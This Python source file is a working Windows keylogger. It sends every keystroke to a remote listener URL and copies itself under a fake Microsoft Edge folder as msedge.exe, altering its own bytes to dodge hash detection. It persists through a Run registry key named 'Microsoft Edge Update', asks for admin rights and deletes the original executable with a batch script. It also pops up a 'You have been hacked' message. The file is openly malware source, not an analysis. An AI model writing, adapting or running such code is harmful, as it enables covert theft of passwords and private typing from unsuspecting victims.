from pynput.keyboard import Listener
import requests
import random
import os
import sys
import subprocess
import winreg as reg
import ctypes
import shutil

# Server URL with HTTPS
server_url = 'https://<listener-ip-or-url>/api/log'

key_press_count = 0

def send_data(key):
    try:
        requests.post(server_url, data={'keystroke': str(key)}, verify=False)
    except Exception as e:
        pass 

def on_press(key):
    global key_press_count
    send_data(key)
    key_press_count += 1
    
    if key_press_count >= 10:
        show_hacked_message()
        key_press_count = 0

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Add reg key for startup
def add_to_startup(exe_name, exe_path):
    try:
        key = reg.HKEY_CURRENT_USER
        key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
        
        key_obj = reg.OpenKey(key, key_value, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key_obj, exe_name, 0, reg.REG_SZ, exe_path)
        reg.CloseKey(key_obj)
    except Exception as e:
        pass  

# Clone and mutate
def clone_and_modify():
    exe_path = sys.executable
    random_number = random.randint(1000, 9999)
    new_folder_name = f"ms edge v{random_number}"
    new_folder_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', new_folder_name)
    new_location = os.path.join(new_folder_path, 'msedge.exe')
    
    os.makedirs(new_folder_path, exist_ok=True)
    
    try:
        shutil.copyfile(exe_path, new_location)
    except Exception as e:
        return False  

    try:
        with open(new_location, 'ab') as f:
            random_bytes = os.urandom(1024)
            f.write(random_bytes)
    except Exception as e:
        return False  

    # Pretend to be edge updater
    add_to_startup("Microsoft Edge Update", new_location)
    
    try:
        subprocess.Popen([new_location, "--cloned"], shell=True)
    except Exception as e:
        return False 

    return True  

# Remove original
def cleanup_original(exe_path):
    try:
        cleanup_script = f'''
        @echo off
        :loop
        tasklist | findstr /i "{os.path.basename(exe_path)}" >nul
        if errorlevel 1 (
            del "{exe_path}"
            exit
        )
        timeout /t 1 /nobreak >nul
        goto loop
        '''
        
        cleanup_file = os.path.join(os.getenv('TEMP'), 'cleanup.bat')
        with open(cleanup_file, 'w') as script_file:
            script_file.write(cleanup_script)
        
        subprocess.Popen([cleanup_file], shell=True)
    except Exception as e:
        pass  

# Show message box
def show_hacked_message():
    try:
        ctypes.windll.user32.MessageBoxW(0, "You have been hacked! I am listening to everything you type!", "Security Alert", 0x10 | 0x40)
    except Exception as e:
        pass  

def check_admin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    if not is_admin:
        # Prompt the user for admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

if __name__ == "__main__":
    check_admin()
    
    if "--cloned" not in sys.argv:
        if clone_and_modify():
            cleanup_original(sys.executable)
            os._exit(0)  
        else:
            sys.exit(1) 

    main()
